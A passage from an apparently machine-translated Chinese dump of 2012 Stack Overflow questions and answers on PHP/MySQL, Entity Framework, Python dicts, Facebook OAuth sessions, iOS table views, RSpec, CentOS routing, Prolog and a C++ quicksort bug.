WHERE order_status='Pending' 
```

在 sql 中（我现在将一个关联数组作为结果，其中您只有相应行的结果）：

```
if ($row['okErrorFlag']=='Error')
{
     echo 'ERROR: There is no rail order';
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-21T10:23:17.580

尝试使用 case 语句

```
select id,
case order_type
    when '1' then order_type
    when '0' then 'error'
end 
from
`sales_orders`
where order_status='pending' 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-21T10:17:34.187

尝试这个：

```
SELECT IF(order_type=1,order_no,'Error') 
FROM sales_orders 
WHERE order_status='Pending' 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-11-21T12:52:59.467

最后我得到了我需要的东西......

## 这是查询：

*   $sql_da_num= "SELECT order_no FROM sales_orders WHERE order_status='Pending' and order_type = '1');

    ```
     $result_da_num= db_query($sql_da_num);
                $num_rows = db_num_rows($result_da_num);
                if ($num_rows==0)
                {
                display_error("There is no Rail Order for this selected customer");
                }
                } 
    ```

# c# - 实体框架（5.0）代码优先 - 在集合中插入集合

> ID：13490950
> 
> 赞同：0
> 
> 时间：2012-11-21T10:14:51.413
> 
> 标签：c#, asp.net, entity-framework, code-first

我有三个班。

活动 > 创意工坊 > 创意工坊时间

我目前正在寻找将记录插入 Workshop Times 的最佳方法，这是首先使用 ICollections 通过代码运行。

寻找类似的东西，但我知道它不起作用：

```
 //Create connection
        var db = new Context();

        var Event = db.Events
            .Include("Workshops")
            .Include("Workshops.Times")
            .Where(ev => ev.GUID == EventGUID).FirstOrDefault();

        Event.Workshops.Add(new Workshop
        {
            Name = tbWorkshopName.Text,
            Description = tbWorkshopDescription.Text,
            Times.Add(new WorkshopTime{
                //Information for times
            })
        });

        db.SaveChanges(); 
```

砍掉的课程：

```
public class Workshops{
    public int id { get; set; }
    public string name { get; set; }
    public ICollection<WorkshopTimes> Times{get;set;}
}
public class Events {
    public int id { get; set; }
    public string name { get; set; }
    public ICollection<Workshops> WorkShops { get; set; }
}

public class WorkshopTimes {
    public int id { get; set; }
    public DateTime time { get; set; }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T10:28:04.583

您的查询肯定走在正确的轨道上，但是您的包含语句似乎不正确。从您的模型中，我期望：

```
 var Event = db.Events
        .Include("WorkShops")
        .Include("WorkShops.events")
        .Where(ev => ev.GUID == EventGUID).FirstOrDefault(); 
```

请注意，这使用属性名称而不是类型。这将确保列出的导航属性中的实体将包含在结果中。

此外，您可以使用 lambda 来做同样的事情（但它的类型安全）

在此处查看如何执行与您的非常相似的场景：

[EF Code First - Include(x => x.Properties.Entity) a 1 : 许多关联](https://stackoverflow.com/questions/5159621/ef-code-first-includex-x-properties-entity-a-1-many-association)

或来自罗文米勒（来自 EF 团队）

[http://romiller.com/2010/07/14/ef-ctp4-tips-tricks-include-with-lambda/](http://romiller.com/2010/07/14/ef-ctp4-tips-tricks-include-with-lambda/)

并确保您使用`using System.Data.Entities`基于 lambda 的包含（[DbQuery.Include() 的重载在哪里需要一个 lambda？](https://stackoverflow.com/questions/9856955/where-did-the-overload-of-dbquery-include-go-that-takes-a-lambda/9856985#9856985)）

# python - python中的哈希表按文件

> ID：13490951
> 
> 赞同：2
> 
> 时间：2012-11-21T10:14:54.640
> 
> 标签：python, hash

我想从文件 txt 在 python 中实现一个哈希表。我的文件是这样的`example.txt`：

```
aaa.12
bbb.14
ccc.10 
```

我可以在 python 中打开这个文件，但我不知道如何在哈希表中导入每一行：

```
{'aaa':12, 'bbb':14, 'ccc':10} 
```

好的，非常感谢。另一个问题..如果我想订购价值并将项目保存在文件中，我该怎么办？我尝试使用它：在您的代码之后，我保存值 v=sorted(hash.values()) 并检查它是否有效，我打印 v 所以结果是：v =[10,14,14]。所以它有效。但知道如何更改原始文件 example.txt 并按以下顺序保存：ccc.10 aaa.12 bbb.14

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-21T10:18:47.157

如果`aaa.12`, 等项分别位于单独的行上：

```
with open('example.text') as f:
    hash = {}
    for line in f:
        key, value = line.strip().split('.', 1)
        hash[key] = int(value) 
```

请注意，您可能指的是`dict`类型，它是一种特定类型的 python 映射，恰好在底层实现中使用哈希表。

# php - 授权和 PHP-Session

> ID：13490958
> 
> 赞同：1
> 
> 时间：2012-11-21T10:15:12.487
> 
> 标签：php, facebook, session

我试图找到几个小时的解决方案 - 没有成功。所以我希望你们中的一个人可以帮我解决这个问题：这个脚本似乎总是开始一个新的会话——我不知道为什么。

```
<?php

$code = $_REQUEST["code"];

if(empty($code)) {
 $_SESSION['state'] = md5(uniqid(rand(), TRUE)); 
 $dialog_url = "https://www.facebook.com/dialog/oauth?client_id=" 
   . $app_id . "&redirect_uri=" . urlencode($my_url) . "&state="
   . $_SESSION['state']. "&scope=publish_actions,publish_stream";

 echo("<script> top.location.href='" . $dialog_url . "'</script>");
}

if($_SESSION['state'] && ($_SESSION['state'] === $_REQUEST['state'])) {
     $token_url = "https://graph.facebook.com/oauth/access_token?"
   . "client_id=" . $app_id . "&redirect_uri=" . urlencode($my_url)
   . "&client_secret=" . $app_secret . "&code=" . $code;

 $response = file_get_contents($token_url);
 $params = null;
 parse_str($response, $params);
  $_SESSION['access_token'] = $params['access_token'];
}
else {
 echo("Sessionstate: ".$_SESSION['state']."<br>");
 echo("REQUEST_state: ".$_REQUEST['state']."<br>");
 echo("Sessionstatus stimmt nicht mit dem REQUEST_State &uuml;berein.");
 var_dump ($_REQUEST);
 exit;
}
?> 
```

在此脚本包含在常规中之前，会话在包含的文件中开始：

```
 session_start(); 
```

我试图通过“状态”

```
 <form action="<?=$_SERVER['PHP_SELF'];?>?what=save&state=<?=$_SESSION['state'];?>" method="post" enctype="multipart/form-data"> 
```

从我的 index.php 文件中。

感谢您阅读并帮助我。

问候克里斯蒂安。

编辑：这是开发者博客的链接：[https ://developers.facebook.com/blog/post/2011/05/13/how-to--handle-expired-access-tokens/](https://developers.facebook.com/blog/post/2011/05/13/how-to--handle-expired-access-tokens/)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T10:20:43.503

您应该只在没有会话时才开始会话。你保存会话吗？

```
<?php
  if (!isset ($_COOKIE[ini_get('session.name')])) {
    session_start();
  }
?> 
```

# nsarray - 连接 2 个或更多表视图以显示来自同一个 nsarray 的信息

> ID：13490959
> 
> 赞同：1
> 
> 时间：2012-11-21T10:15:13.813
> 
> 标签：nsarray

我很困惑并尝试了许多不同的方法来消除我面临的错误。

我有一个 NSArray 的蛋白质，在我的故事板中我有两个单独的表格视图，我希望它们都显示 protiens 数组。

我在 -(UITableViewcell *) 和 @end 有错误，其中有两个 } 错误。

如果有人可以提供帮助，请在下面找到我的 ViewController.m 代码：​​（请忽略结尾处的 segue 编码）

```
#import "JViewController.h"
#import "OneViewController.h"
#import "TwoViewController.h"

@interface JViewController ()

@end

@implementation JViewController
{
    NSArray *proteins;
}

@synthesize tableView1;
@synthesize tableView2;

- (void)viewDidLoad
{
    [super viewDidLoad];
    // Do any additional setup after loading the view, typically from a nib.
    proteins = [NSArray arrayWithObjects:@"Chicken", @"Turkey", @"Ham", @"Steak", @"Pork   Chop",     @"Roast Lamb", @"Salmon", @"Egg", @"Lentils", @"Kidney Beans", nil];
}

- (NSInteger)tableView:(UITableView *)tableView numberOfRowsInSection:(NSInteger)section
{
    if (tableView == tableView1) {
        return [proteins count];
    {
    if (tableView == tableView2) {
        return [proteins count];
    }
}

- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath
{
    static NSString *CellIdentifier = @"ProteinCell";

    UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier:CellIdentifier];

    if (cell == nil) {
        cell = [[UITableViewCell alloc] initWithStyle:UITableViewCellStyleDefault reuseIdentifier:CellIdentifier];
    }
    if (tableView1 == tableView2)
    {
        proteins;
    }
    else
    {
        proteins;
    }

    cell.textLabel.text = [proteins objectAtIndex:indexPath.row];
    return cell;
}

- (void)prepareForSegue:(UIStoryboardSegue *)segue sender:(id)sender
{
    if ([segue.identifier isEqualToString:@"showMealOneDetail"])
    {
    NSIndexPath *indexPath = [self.tableView indexPathForSelectedRow];
    OneViewController *destViewController = segue.destinationViewController;
    destViewController.proteinName = [proteins objectAtIndex:indexPath.row];
    }
}

- (void)didReceiveMemoryWarning
{
    [super didReceiveMemoryWarning];
    // Dispose of any resources that can be recreated.
}

@end 
```

非常感谢您提前。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T10:31:09.410

你这里有两个开括号，关闭这个：

```
 - (NSInteger)tableView:(UITableView *)tableView numberOfRowsInSection:(NSInteger)section
{
    if (tableView == tableView1) {
        return [proteins count];
   ->> {
    if (tableView == tableView2) {
        return [proteins count];
    }
} 
```

你这是什么意思？

```
 if (tableView1 == tableView2)
{
    proteins;
}
else
{
    proteins;
} 
```

尝试这个：

```
 - (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath
{
    static NSString *CellIdentifier = @"ProteinCell";

    UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier:CellIdentifier];

    if (cell == nil) {
        cell = [[UITableViewCell alloc] initWithStyle:UITableViewCellStyleDefault reuseIdentifier:CellIdentifier];
    }

    cell.textLabel.text = [proteins objectAtIndex:indexPath.row];
    return cell;
} 
```

您是否能够在一个表格视图中显示任何内容？确保您已连接数据源和委托。

希望它有帮助=)

# python - 如何在 python 2.7x 中展平嵌套字典

> ID：13490963
> 
> 赞同：3
> 
> 时间：2012-11-21T10:15:29.847
> 
> 标签：python

我有一个嵌套的字典，如下所示。我如何将其展平，以便每个 botten 级别都有一行作为列表列表？

例如

```
 [[en,Chome,ChromeOS,null,180, '0', '0', '0', '0',
  [en, Linux,null,27868, '0', '0', '0', '0'],
  ...
 ] 
```

输入

```
test = {u'en': {'Chrome': {'ChromeOS': {u'null': [180, '0', '0', '0', '0']},
                    'Linux': {u'null': [27868, '0', '0', '0', '0']},
                    'Macintosh': {u'null': [330991, '0', '0', '0', '0']},
                    'Windows': {u'null': [3296819, '0', '0', '0', '0']}},
         'Firefox': {'Linux': {u'null': [18076, '0', '0', '0', '0']},
                     'Macintosh': {u'null': [168444, '0', '0', '0', '0']},
                     'Windows': {u'null': [1517775, '0', '0', '0', '0']}},
         'Konqueror': {'Linux': {u'null': [9, '0', '0', '0', '0']}},
         'Microsoft Internet Explorer': {'Windows': {u'null': [3060154,
                                                               '0',
                                                               '0',
                                                               '0',
                                                               '0']}},
         'Opera': {'Linux': {u'null': [2274, '0', '0', '0', '0']},
                   'Macintosh': {u'null': [1573, '0', '0', '0', '0']},
                   'Windows': {u'null': [38589, '0', '0', '0', '0']}},
         'Opera Mobile': {'Linux': {u'null': [5807, '0', '0', '0', '0']},
                          'Windows': {u'null': [1, '0', '0', '0', '0']}},
         'Safari': {'Blackberry': {u'null': [530, '0', '0', '0', '0']},
                    'Linux': {u'null': [292862, '0', '0', '0', '0']},
                    'Macintosh': {u'null': [618641, '0', '0', '0', '0']},
                    'Windows': {u'null': [36359, '0', '0', '0', '0']}},
         'SeaMonkey': {'Linux': {u'null': [120, '0', '0', '0', '0']},
                       'Macintosh': {u'null': [224, '0', '0', '0', '0']},
                       'Windows': {u'null': [1890, '0', '0', '0', '0']}},
         'WOSBrowser': {'Linux': {u'null': [687, '0', '0', '0', '0']}},
         'null': {'null': {u'null': [15559, '0', '0', '0', '0']}}}} 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-11-21T10:26:05.047

```
def flatten_dict(d):
    for k,v in d.items():
        if isinstance(v, dict):
            for item in flatten_dict(v):
                yield [k]+item
        else:
            yield v

flattened = list(flatten_dict(test)) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-11-12T12:28:57.260

如果终端节点不是列表，那么您应该“yield [v]”而不是“yield v”。

# android - 如何使用 TabHost 在某个选项卡上查找

> ID：13490964
> 
> 赞同：0
> 
> 时间：2012-11-21T10:15:33.507
> 
> 标签：android, view, tabs, android-tabhost

我正在使用 TabHost，我有四个选项卡。当我开始相关活动时，我希望选择第二个选项卡，而不是第一个

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T10:18:16.610

我想知道你怎么没有在 Google Docs 中看到这个。

无论如何，下面是答案。

```
 tabHost.setCurrentTab(index); // pass 1 if you want second tab to be selected. 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-21T10:18:24.963

将当前选项卡设置为：mTabHost.setCurrentTab(2);

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-21T10:24:23.297

早上好，使用`tabHost.setCurrentTab(index)`，例如：

```
TabHost tabHost = getTabHost();
tabHost.setCurrentTab(2)

TabSpec tab1 = tabHost.newTabSpec("Tab 1");
tabHost.addTab(... ...)

TabSpec tab2 = tabHost.newTabSpec("Tab 2");
tabHost.addTab(... ...) 
```

祝你好运..

# rspec2 - Rspec 新的期望语法

> ID：13490969
> 
> 赞同：0
> 
> 时间：2012-11-21T10:15:53.940
> 
> 标签：rspec2, rspec-rails

我有以下 rspec 单元测试：

```
require 'spec_helper'

describe Article do
  describe ".recents" do
    it "includes articles created less than one week ago" do
      article = Article.create(created_at: Date.today - 1.week + 1.second)
      expect(Article.recents).to eql([article])
    end

    it "excludes articles published at midnight one week ago" do
      article = Article.create!(:created_at => Date.today - 1.week)
      expect(Article.recents).to be_empty
    end

  end
end 
```

和`Article`模型：

```
class Article < ActiveRecord::Base
  attr_accessible :description, :name, :price, :created_at

  scope :recents, where('created_at <= ?', 1.week.ago)
end 
```

当我运行测试时，我得到：

```
1) Article.recents includes articles created less than one week ago
     Failure/Error: expect(Article.recents).to eql([article])

       expected: [#<Article id: 60, name: nil, description: nil, price: nil, created_at: "2012-11-14 00:00:01", updated_at: "2012-11-21 10:12:33", section_id: nil>]
            got: [#<Article id: 60, name: nil, description: nil, price: nil, created_at: "2012-11-14 00:00:01", updated_at: "2012-11-21 10:12:33", section_id: nil>]

       (compared using eql?)

       Diff:#<ActiveRecord::Relation:0x007ff692bce158>.==([#<Article id: 60, name: nil, description: nil, price: nil, created_at: "2012-11-14 00:00:01", updated_at: "2012-11-21 10:12:33", section_id: nil>]) returned false even though the diff between #<ActiveRecord::Relation:0x007ff692bce158> and [#<Article id: 60, name: nil, description: nil, price: nil, created_at: "2012-11-14 00:00:01", updated_at: "2012-11-21 10:12:33", section_id: nil>] is empty. Check the implementation of #<ActiveRecord::Relation:0x007ff692bce158>.==.
     # ./spec/models/article_spec.rb:7:in `block (3 levels) in <top (required)>' 
```

有人可以帮我弄清楚我的测试中有什么错误吗？

这对我来说似乎很好。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-21T12:00:17.640

您正在将 activerecord 关系 ( `Article.recents`) 与数组 ( `[article]`) 进行比较，这就是预期失败的原因。（看起来它们在规范结果中是相同的，因为`inspect`在打印出来之前将关系转换为数组。）

将您的第一个期望更改为：

```
expect(Article.recents.to_a).to eql([article]) 
```

# matlab - 数据集 - 10%

> ID：13490970
> 
> 赞同：0
> 
> 时间：2012-11-21T10:15:55.433
> 
> 标签：matlab

以下是对我的 10% 数据进行采样的方法：

```
%%
% Normal
normIdx = strmatch('normal.', K2);
normalSubset = cluster2(normIdx, :);
normal = randperm(size(normalSubset , 1));
p = (normal(1:3495))';

%% DoS
DoSIdx = strmatch('DoS', K2);
DoSSubset = cluster2(DoSIdx, :);
DoS = randperm(size(DoSSubset , 1));
a = (DoS(1:8))';

%%
ProbeIdx = strmatch('Probe', K2);
ProbeSubset = cluster2(ProbeIdx, :);
Probe = randperm(size(ProbeSubset , 1));
d = (Probe(1:71))';

%%
normalSample = normalSubset (p, :);
%%
DoSSample = DoSSubset (a, :);
%%
ProbeSample = ProbeSubset (d, :);

%%
idx = [normIdx(p);DoSIdx(a);ProbeIdx(d)];
%
sample = [normalSample ; DoSSample ; ProbeSample]
%
shuffle = randperm(3574);
%
TestData = sample(shuffle,:);
%
TestDataLabels = K2(idx (shuffle), :); 
```

我想知道如何才能从数据集中删除这 10% ( `cluster2`)？请注意，当我说 10% 时，我已经解决了这个问题，因此 (Probe(1:71) 这是探测类的 10% 等

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-21T11:11:28.877

如果我理解正确，您有一个索引向量`idx`，其中包含您要保留的所有行。

在这种情况下，解决方案非常简单，要删除它们，您可以按照@H.Munster 指示的方法，但使用正确的索引：

```
cluster2(idx, :) = []; 
```

# linux - 虚拟机-将centos设置为路由器

> ID：13490971
> 
> 赞同：-1
> 
> 时间：2012-11-21T10:15:57.023
> 
> 标签：linux, centos, vmware, vmware-workstation

这是我的情况，

我需要将linux系统配置为路由器和客户端也在虚拟机中..

## 系统 A

### eth0：从isp获取ip（在VM中配置为Bidge）

### eth1：

```
DEVICE=eth1
BOOTPROTO=static
ONBOOT=yes
HWADDR=00:0c:29:0a:eb:ec
IPADDR=192.168.100.1
NETMASK=255.255.255.0
IPV6INIT=no
TYPE=Ethernet
PREFIX=24
GATEWAY=192.168.100.1
DEFROUTE=yes
IPV4_FAILURE_FATAL=yes 
```

### 控制 IP 数据包转发

net.ipv4.ip_forward = 1

> 路由添加 -net 192.168.100.0 网络掩码 255.255.255.0 gw 1​​92.168.100.1 dev eth1

到目前为止，这是我在系统 A 中所做的......在系统 B 中，我配置了静态 IP 地址

```
DEVICE=eth0
BOOTPROTO=static
ONBOOT=yes
HWADDR=00:0c:29:0a:eb:ec
IPADDR=192.168.100.2
NETMASK=255.255.255.0
GATEWAY=192.168.100.1 
```

系统 A 和系统 B 都是虚拟操作系统。SystemA被认为是路由器，System B被认为是客户端......

我错过了什么...

提前致谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T11:34:22.440

添加路线是错误的。该路由将自动添加，因为它是接口连接路由。

您可能做错了没有配置 DNS 服务器。

如果您提供更多详细信息，我们可以给出更好的答案。

# iphone - 使用带有预设地址的 UIWebView 作为应用内实物支付的选项

> ID：13490972
> 
> 赞同：0
> 
> 时间：2012-11-21T10:15:58.460
> 
> 标签：iphone, uiwebview, payment

我们有一个便于销售实物商品（拍卖风格）的应用程序。

我一直在搜索论坛，才发现我不应该使用 StoreKit，而应该使用其他支付方式（如 card.io、ZooZ、PayPal API）。我的问题是我们的大多数客户可能没有 PayPal 帐户，包括在东欧等地区。

你知道吗，如果有一个选项，在成功购买后，我的应用程序将打开`UIWebView`预设数据（如网上银行门户，填写字段，例如支付金额、可变符号、客户姓名）？我在某处读到，使用`UIWebView`会使我的应用程序被拒绝，我应该打开 Safari 浏览器，但人们对此的看法各不相同。

有经验或使用 UIWebView 批准他的应用程序的人可以回复吗？我已经阅读了至少 10 次苹果指南，但我仍然感到困惑。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-16T20:45:19.857

> 我在某处读到，使用 UIWebView 会使我的应用程序被拒绝，我应该打开 safari 浏览器

Apple 不会因为某个应用使用`UIWebView`.

> 你知道吗，如果有一个选项，在购买成功后，我的应用会打开带有预设数据的 UIWebView

您可能可以使用此方法：`- (NSString *)stringByEvaluatingJavaScriptFromString:(NSString *)script`

# php - 输出中缺少行

> ID：13490973
> 
> 赞同：0
> 
> 时间：2012-11-21T10:16:07.663
> 
> 标签：php, mysql, select

我有一个小问题，我找不到答案。

我有一个名为`product_features`以下字段的表：

```
product_features
----------------------
 id  parent_id  name      order    added_date 
```

现在的问题是我刚刚插入了 2 行具有相同名称：

```
734     1   6008-2 test     0   2012-11-21 11:52:28
735     1   6008-2 test     0   2012-11-21 11:57:27 
```

我已经定义`id - PRIMARY INDEX - AUTO INCREMENT`并`parent_id - INDEX`

```
Keyname Type    Unique  Packed  Column     Cardinality  Collation
PRIMARY BTREE   Yes      No product_feature_id  671         A       
product_feature_parent_id   BTREE   No  No  product_feature_parent_id   671 A 
```

当我打印结果时，唯一打印的行是最后一行。我真的不明白为什么。这是我正在使用的功能：

```
public function printProductFeaturesTable($product_feature_parent_id = 0, $level = 0){
        $sql = $this->mysqli->query("SELECT product_feature_id, product_feature_name
                                     FROM product_features
                                     WHERE product_feature_parent_id='" . $product_feature_parent_id . "'
                                     ORDER BY product_feature_order");
        if($sql->num_rows != 0) {

            if($level != 0)
                echo '<table cellpadding="0" cellspacing="1" class="dnd"><tbody>';

            $i = 0;
            while($row = $sql->fetch_assoc()) {
                $i++;
                echo '<tr>
                        <td width="30" valign="top" align="center">', 
                            $i, '.
                        </td>
                        <td>', 
                            $row['product_feature_name'],
                            '<div class="table-options">
                                <input type="hidden" name="product_feature_id[]" value="', $row['product_feature_id'], '" /> 
                                <a href="/admin/product-features/add-modify/', $row['product_feature_id'], '" class="ui-state-default ui-corner-all left"><span class="ui-icon ui-icon-pencil"></span></a>
                                <a href="javascript:if(confirm(\'Are you sure you want to delete this feature?\')) document.location = \'/admin/resources/php/product-features.php?p=delete&pfid=', $row['product_feature_id'], '\'" class="ui-state-default ui-corner-all left"><span class="ui-icon ui-icon-close"></span></a>
                            </div>';

                $this->printProductFeaturesTable($row['product_feature_id'], $level + 1);

                echo '  </td>
                    </tr>'; 
            }

            if($level != 0)
                echo '</tbody></table>';
        } else
            if($product_feature_parent_id == 0)
                echo '<tr><td align="center" colspan="2">Nici o specificatie de produs adaugata momentan!</td></tr>';
    } 
```

结果应该是这样的：

```
1\. Test
   1\. Test subcategory
   2\. Test subcategory 2
   3\. 6008-2 test
   4\. 6008-2 test 
```

但不是上面的例子，结果是：

```
1\. Test
   1\. Test subcategory
   2\. Test subcategory 2
   3\. 6008-2 test // this is the last inserted row.. but where is the other one??? 
```

提前谢谢你！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T10:41:15.647

Ok.. I've just discovered that the only problem were my eyes, as you can see i'm ordering the results by `product_feature_order`, which in this example is 0 by default.

So the problem was that the order they are shows is not in the order of the inserted id, which really confused me..

Thank you for your time!

# prolog - Prolog 非同质列表

> ID：13490974
> 
> 赞同：3
> 
> 时间：2012-11-21T10:16:09.927
> 
> 标签：prolog

有没有办法在序言中编写非同质列表？
我想创建一个包含符号和整数的列表。就像是： **`[A 2 3 B C D E]`**

谢谢

PS I 用户 Turbo Prolog 2.0

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-21T12:14:25.880

Turbo Prolog 要求列表元素为单一类型。*但是*有一种方法可以解决这个问题 - 您只需要定义一个可以表示整数和符号的单一类型。您可以通过定义一个*复合域*来做到这一点，其中每种不同的类型都用不同的函子包装。因此，例如：

```
mixed_type = i(integer); s(symbol).
mixed_list = mixed_type*. 
```

缺点是每个列表元素都需要一个仿函数，这有点尴尬：

```
[s(a), i(2), i(3), s(b), s(c)] 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-21T10:58:14.520

Prolog 只有一种数据类型，因此*每个*列表都是同质的。

Prolog 中的每个元素都只是一个**术语**。`a`是一个术语，`a(x,y)`是一个术语，`3`是一个术语，语言中没有任何东西可以区分它们。当然，许多内置谓词根据类型进行区分——你不能指望得到答案`X is 1 + a`——但语言本身没有区别。

因此，要回答您的问题，您可以在列表中添加任何您想要的内容，包括以上所有内容 - 以下是有效的 Prolog：

```
L = [a, a(x,y), 3, X is 1 + a]. 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-21T10:48:55.750

是的，Prolog 中没有类型。你必须用引号写大写字母：['A', 2, 3, 'B', 'C' 'D', 'E', f, g]

# c++ - 使用插入排序算法时出错 - 数组未准确排序。

> ID：13490976
> 
> 赞同：-1
> 
> 时间：2012-11-21T10:16:15.243
> 
> 标签：c++, algorithm, quicksort, insertion-sort

这是一些工作代码，它实现了快速排序算法的修改版本，该算法使用插入排序来处理数组大小`n > 8`。我的测试数组排序不完全正确，我认为它必须与我的`Insertionsort`and实现有关`Insert`。

`Insertionsort`递归算法的一般形式是：

```
void Insertionsort(int S[], int n)
{
        if(n>1)
                Insertionsort(S,n-1);
        Insert(S,n-1);

}

void Insert(int *S, int k)
{
        int key = S[k];
        int j = k-1;
        while(j>=0 && S[j] > key)
        {
                S[j+1] = S[j];
                j--;
        }

        S[j+1] = key;
} 
```

这是我的完整工作代码，但排序不完全正确：

```
#include <iostream>
#include <string>
#include <stdlib.h>
using namespace std;

int comparisons = 0;            
int compare_qs_m3_ins[12];  

// Function prototypes
int partition(int *S,int l, int u);                                          
void exchange(int list[], int p, int q);
void Insert(int S[], int k);                                                
void Insertionsort(int S[], int low, int hi);                           
void Quicksort_Insert_M3(int S[], int n, int p, int r);       

int main()
{
    srand (time(NULL));
    // Declare all arrays used for testing
    int S1_500[500];
    int S2_500[500];
    int S3_500[500];

    int S1_300[300];
    int S2_300[300];
    int S3_300[300];

    int S1_100[100];
    int S2_100[100];
    int S3_100[100];

    int S1_8[8];
    int S2_8[8];
    int S3_8[8];

    // Fill arrays with random integers
    for(int i=0; i<500; i++)
    {
        S1_500[i] = rand()%1000;
        S2_500[i] = rand()%1000;
        S3_500[i] = rand()%1000;
    }

    for(int i=0; i<300; i++)
    {
        S1_300[i] = rand()%1000;
        S2_300[i] = rand()%1000;
        S3_300[i] = rand()%1000;
    }

    for(int i=0; i<100; i++)
    {
        S1_100[i] = rand()%500;
        S2_100[i] = rand()%500;
        S3_100[i] = rand()%500;
    }

    for(int i=0; i<8; i++)
    {
        S1_8[i] = rand()%100;
        S2_8[i] = rand()%100;
        S3_8[i] = rand()%100;
    }

    Quicksort_Insert_M3(S1_500,500,0,499);
    compare_qs_m3_ins[0] = comparisons;
    comparisons = 0;
    Quicksort_Insert_M3(S2_500,500,0,499);
    compare_qs_m3_ins[1] = comparisons;
    comparisons = 0;
    Quicksort_Insert_M3(S3_500,500,0,499);
    compare_qs_m3_ins[2] = comparisons;
    comparisons = 0;
    Quicksort_Insert_M3(S1_300,300,0,299);
    compare_qs_m3_ins[3] = comparisons;
    comparisons = 0;
    Quicksort_Insert_M3(S2_300,300,0,299);
    compare_qs_m3_ins[4] = comparisons;
    comparisons = 0;
    Quicksort_Insert_M3(S3_300,300,0,299);
    compare_qs_m3_ins[5] = comparisons;
    comparisons = 0;
    Quicksort_Insert_M3(S1_100,100,0,99);
    compare_qs_m3_ins[6] = comparisons;
    comparisons = 0;
    Quicksort_Insert_M3(S2_100,100,0,99);
    compare_qs_m3_ins[7] = comparisons;
    comparisons = 0;
    Quicksort_Insert_M3(S3_100,100,0,99);
    compare_qs_m3_ins[8] = comparisons;
    comparisons = 0;
    Quicksort_Insert_M3(S1_8,8,0,7);
    compare_qs_m3_ins[9] = comparisons;
    comparisons = 0;
    Quicksort_Insert_M3(S2_8,8,0,7);
    compare_qs_m3_ins[10] = comparisons;
    comparisons = 0;
    Quicksort_Insert_M3(S3_8,8,0,7);
    compare_qs_m3_ins[11] = comparisons;
    comparisons = 0;

    //for(int i=0; i<12; i++)
        //cout << compare_qs_m3_ins[i] << endl;

    for(int i=0;i<499;i++)
        cout << S1_500[i] << endl;

}

int partition(int *S,int l, int u)
{
    int x = S[l];
    int j = l;
    for(int i=l+1; i<=u; i++)
    {
        comparisons++;
        if(S[i] < x)
        {   
            j++;
            swap(S[i],S[j]);
        }

    }
    int p = j;
    swap(S[l],S[p]);
    return p;
}

void swap(int &val1, int &val2)
{
    int temp = val1;
    val1 = val2;
    val2 = temp;
}

void exchange(int list[], int p, int q)
{
    int temp = list[p];
    list[p] = list[q];
    list[q] = temp;
}

int Sort3(int list[], int p, int r)
{
    int median = (p + r) / 2;
    comparisons++;
    if(list[p] <= list[median])
    {
        comparisons++;
        if(list[median]>list[r])
        {
            comparisons++;
            if(list[p]<list[r])
            {
                int temp = list[p];
                list[p] = list[r];
                list[r] = list[median];
                list[median] = temp;
            }
            else
            {
                exchange(list,median,r);
            }
        }
        else
            ;

    }
    else
    {
        comparisons++;
        if(list[p] > list[r])
        {
            comparisons++;
            if(list[median] < list[r])
            {
                int temp = list[p];
                list[p] = list[median];
                list[median] = list[r];
                list[r] = temp;
            }
            else
            {
                exchange(list,p,r);
            }
        }
        else
        {
            exchange(list,p,median);
        }

    }

    return list[r];
}

void Insert(int *S, int k)
{
    int key = S[k];
    int j = k-1;
    while(j>=0 && S[j] > key)
    {
        S[j+1] = S[j];
        j--;
        comparisons++;
    }
    comparisons++;
    S[j+1] = key;
}

void Insertionsort(int S[], int low, int hi)
{
    if((hi-low)+1>1)
        Insertionsort(S,low+1,hi);
    Insert(S,hi-low);

}

void Quicksort_Insert_M3(int S[], int n, int low, int hi)
{
    if((hi-low)<=8)
        Insertionsort(S,low,hi);
    else 
    {
        if(low < hi)
        {
            if((low+1) == hi)
            {
                comparisons++;
                if(S[low] > S[hi])
                    swap(S[low],S[hi]);
            }
            else
            {
                Sort3(S,low,hi);
                if((low+2)<hi)
                {
                    swap(S[low+1],S[(low+hi)/2]);
                    int q = partition(S, low+1, hi-1);
                    Quicksort_Insert_M3(S, n, low, q-1);
                    Quicksort_Insert_M3(S, n, q+1, hi);
                }
            }
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T16:29:05.390

应该按升序对三个数组元素进行排序的函数不会：

```
int Sort3(int list[], int p, int r)
{ 
```

只需要`p + 2 <= r`, 所以

```
 int median = (p + r) / 2; 
```

`p < median < r`这里。让和。`a = list[p]`_`b = list[median]``c = list[r]`

```
 comparisons++;
    if(list[p] <= list[median])
    {
        comparisons++;
        if(list[median]>list[r])
        {
            comparisons++;
            if(list[p]<list[r])
            { 
```

所以在这里我们有`a <= b`,`c < b`和`a < c`, 一起`a < c < b`

```
 int temp = list[p];
                list[p] = list[r];
                list[r] = list[median];
                list[median] = temp; 
```

